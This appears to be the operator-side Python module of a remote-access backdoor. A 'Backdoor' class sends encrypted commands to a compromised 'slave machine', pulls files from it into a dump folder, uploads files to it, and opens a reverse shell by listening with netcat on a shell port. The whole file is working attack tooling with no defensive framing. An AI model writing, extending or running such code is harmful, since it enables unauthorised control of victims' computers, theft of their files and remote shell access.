from sys import stderr, exit, stderr
from os import system, listdir, fork, wait
from socket import error as socket_error
# lib
from .crypto import Crypto 

class Backdoor():

    def __init__(self, conn, ip_addr, port, shell_port):
        self.conn = conn
        self.ip_addr = ip_addr
        self.port = port
        self.shell_port = shell_port
        crypto = Crypto()
        self.crypto = crypto
        self.status = 1

    def get_cmd(self):
        cmd = ""
        while cmd == "":
            cmd = input(">>> ")
        return cmd

    def send_cmd(self, cmd):
        try:
            encoded_cmd = cmd.encode("utf-8")
            encrypted_cmd = self.crypto.encrypt(encoded_cmd)
            self.conn.send(encrypted_cmd)
        except socket_error:
            stderr.write("Error sending command\n")
            
    def drop_shell(self):
        pid = fork()
        if pid == 0:
            system("clear")
            print("Dropping shell on slave machine ...")
            print("Exit netcat sending SIGINT")
            syscmd = "nc -l " + str(self.shell_port)
            system(syscmd)
        else:
            wait()
        self.status = 0 

    def recv_msg(self, buf):
        msg = ""
        try:
            encrypted_msg = self.conn.recv(buf)
            encoded_msg = self.crypto.decrypt(encrypted_msg) 
            msg = encoded_msg.decode("utf-8")
        except socket_error:
            stderr.write("[x] Error receiving response\n")
        return msg

    def builtin_cmds(self, cmd):
        msg = ""
        if cmd[:5] == "shell":
            cmd += str(self.shell_port)
            self.send_cmd(cmd)
            self.drop_shell()
        elif cmd[:5] == "clear":
            system("clear")
            msg = "ACK\n"
        elif cmd[:4] == "exit":
            self.status = 0
        elif cmd[:2] == "dl":
            self.send_cmd(cmd)
            msg = self.recv_msg(64000)
            with open("dump/"+str(cmd)[3:], "w") as fp:
                fp.write(msg[3:])
        elif cmd[:2] == "pl":
            self.send_cmd(cmd[:2])
            system("clear")
            for file in listdir():
                print(file)
            filename = input("$ ")
            with open(filename, "r") as fp:
                data = fp.read()
                self.send_cmd(data)
            msg = "[+] File uploaded to slave machine"
        elif cmd[:3] == "cat":
            filename = cmd[3:]
            self.send_cmd(cmd)
            msg = self.recv_msg(64000)
        else:
            self.send_cmd(cmd)
            return msg
        return msg


    def validate_msg(self, msg):
        slave_ack = msg[:3]
        msg = msg[3:]
        if slave_ack != "ACK":
            stderr.write("[x] Slave did not acknowledge the command\n")
        elif msg[:3] == "404":
            print("Error message from slave: %s" % (msg[3:]))
        else:
            print(msg)

    def display_response(self, msg):
        if msg == "":
            msg = self.recv_msg(1024)
        self.validate_msg(msg)
            
    def cmd_shell(self):
        while self.status != 0:
            cmd = self.get_cmd()
            msg = self.builtin_cmds(cmd)
            self.display_response(msg)

